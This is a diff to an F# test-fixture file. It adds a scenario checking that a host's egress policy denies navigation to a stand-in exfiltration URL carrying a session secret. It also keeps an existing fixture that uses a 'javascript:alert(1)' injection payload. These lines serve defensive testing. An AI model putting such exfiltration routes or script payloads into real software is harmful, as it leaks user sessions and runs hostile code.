@@ -46,7 +46,8 @@ let private fixture (name: string) (tree: Node<obj>) (events: ScriptedEvent list
     { Name = name
       TreeJson = CanonicalJson.encodeNode tree
       Events = events
-      Expected = [] }
+      Expected = []
+      HostPolicy = None }
 
 /// The store mutation, and the re-resolution that makes it visible.
 let private setStateRebinds =
@@ -124,6 +125,39 @@ let private refusedNavigate =
             [ button "go" (Action.Navigate "javascript:alert(1)")
               bound "readout" "msg" "init" ])
         [ click "go" ]
+
+/// A destination the fold ADMITS and the performer seam declines.
+///
+/// It is the exact complement of `refused-navigate` beside it, and the pair is
+/// what makes each of them mean something. There, the scheme floor refuses the
+/// route inside the fold, so no effect is reached at all and every host agrees
+/// because the sanitiser is in the shared interpreter. Here the route is
+/// perfectly well-formed — `https://` with a real host — so the floor passes it,
+/// the fold reaches `Navigate` with the value the program named, and the only
+/// thing standing between it and the world is the host's own destination policy.
+///
+/// **That refusal was invisible to this family until denials existed**, and its
+/// invisibility is the whole reason the phase that added them was worth doing:
+/// `effects` records what the fold EMITTED, and a host that navigated to the
+/// collector produced exactly the same trace as one that declined to. The two
+/// events are chosen so the scenario discriminates in both directions — the
+/// local route is permitted under the same policy, so a host that simply denies
+/// everything fails here too.
+///
+/// The route carries a query string on purpose. It is what an exfiltration
+/// attempt looks like, and the recorded denial naming `exfil.example` and not
+/// the query is §5.3's log-safety rule made executable rather than asserted.
+let private refusedDestination =
+    fixture
+        "refused-destination"
+        (dash
+            [ button "home" (Action.Navigate "/orders")
+              button "leak" (Action.Navigate "https://exfil.example/collect?session=secret")
+              bound "readout" "msg" "init" ])
+        [ click "home"; click "leak" ]
+    |> fun f ->
+        { f with
+            HostPolicy = Some "local-egress-only" }
 
 /// The re-resolution coverage FLOOR: the reactive kinds `resolveTree` covers.
 /// One state write, several bound fields, all of which must re-resolve.
@@ -212,6 +246,7 @@ let all: Fixture list =
       documentedNoOps
       closureFreeEffects
       refusedNavigate
+      refusedDestination
       coverageFloorReactive
       coverageFloorPassThrough
       serverHandlerCall
